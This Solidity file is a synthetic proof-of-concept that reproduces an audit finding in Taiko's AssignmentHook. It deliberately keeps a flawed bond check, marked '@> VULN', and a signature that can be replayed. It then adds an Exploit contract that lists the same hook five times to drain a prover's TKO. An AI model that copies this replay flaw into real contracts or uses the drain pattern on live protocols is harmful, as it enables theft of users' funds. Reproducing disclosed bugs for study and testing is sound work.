// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Taiko AssignmentHook — proposeBlock drains the prover's TKO
    (Sigma Prime, AuditVault 35999)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    proposeBlock runs every hook the proposer lists and then only checks
    that Taiko received AT LEAST one liveness bond. The same assignment
    signature is accepted on every call. Five copies of the hook pull
    500 TKO from the prover when the bond is 100.
    Vulnerable check preserved verbatim in spirit (@> VULN). */

interface IHook {
    function onBlockProposed(address proposer, uint8 v, bytes32 r, bytes32 s) external;
}

contract Tko {
    string public constant symbol = "TKO";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) internal _allowance;

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowance[owner][spender];
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        _allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        require(balanceOf[from] >= amount, "tko");
        if (msg.sender != from) {
            require(_allowance[from][msg.sender] >= amount, "allowance");
            _allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract AssignmentHook is IHook {
    Tko public tko;
    uint256 public bond;
    uint256 public fee;
    address public prover;
    bytes32 public digest;

    constructor(Tko _tko, uint256 _bond, uint256 _fee, address _prover, bytes32 _digest) {
        tko = _tko;
        bond = _bond;
        fee = _fee;
        prover = _prover;
        digest = _digest;
    }

    function onBlockProposed(address proposer, uint8 v, bytes32 r, bytes32 s) external {
        address signer = ecrecover(digest, v, r, s);
        require(signer == prover, "sig");
        // The assignment is not consumed. The same signature passes on the next call.
        tko.transferFrom(prover, msg.sender, bond);
        tko.transferFrom(proposer, prover, fee);
    }
}

contract TaikoL1 {
    error L1_LIVENESS_BOND_NOT_RECEIVED();

    struct HookCall {
        address hook;
    }

    Tko public tko;
    uint256 public livenessBond;

    constructor(Tko _tko, uint256 _livenessBond) {
        tko = _tko;
        livenessBond = _livenessBond;
    }

    function proposeBlock(HookCall[] calldata params, uint8 v, bytes32 r, bytes32 s) external {
        uint256 tkoBalance = tko.balanceOf(address(this));
        for (uint256 i; i < params.length; ++i) {
            IHook(params[i].hook).onBlockProposed(msg.sender, v, r, s);
        }
        // @> VULN: any pull of at least one bond is accepted, so repeated hooks over-charge the prover
        if (tko.balanceOf(address(this)) < tkoBalance + livenessBond) {
            revert L1_LIVENESS_BOND_NOT_RECEIVED();
        }
    }
}

contract Exploit {
    uint256 public constant BOND = 100 ether;
    uint256 public constant FEE = 1 ether;
    uint256 public constant PULLS = 5;
    address public constant PROVER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    bytes32 public constant DIGEST = 0xd80bab8f9f3df0f1b5d9530e049de88535ffe8578bb7b02d0aac2c716e5e7eb5;

    Tko public tko;
    AssignmentHook public hook;
    TaikoL1 public taiko;

    constructor() {
        tko = new Tko();
        hook = new AssignmentHook(tko, BOND, FEE, PROVER, DIGEST);
        taiko = new TaikoL1(tko, BOND);
        tko.mint(PROVER, BOND * PULLS);
        tko.mint(address(this), FEE * PULLS);
    }

    function run() external {
        require(tko.balanceOf(PROVER) == BOND * PULLS, "prover not funded");
        tko.approve(address(hook), FEE * PULLS);

        TaikoL1.HookCall[] memory calls = new TaikoL1.HookCall[](PULLS);
        for (uint256 i; i < PULLS; ++i) {
            calls[i].hook = address(hook);
        }
        taiko.proposeBlock(
            calls,
            27,
            0xa8c0cdd93c6a6c2bf49a109af58552aba1ffcadc146aa88de83170d079d47a19,
            0x10a13eaf88cfd8b938aa66b8e0d8ec633c76b30eee49887c414487d98a20ffe8
        );

        require(tko.balanceOf(address(taiko)) == BOND * PULLS, "five bonds were not pulled");
        require(tko.balanceOf(PROVER) == FEE * PULLS, "prover was not drained");
        require(tko.balanceOf(address(this)) == 0, "attacker fee was not paid");
        require(BOND * PULLS > BOND, "excess over one bond");
    }
}
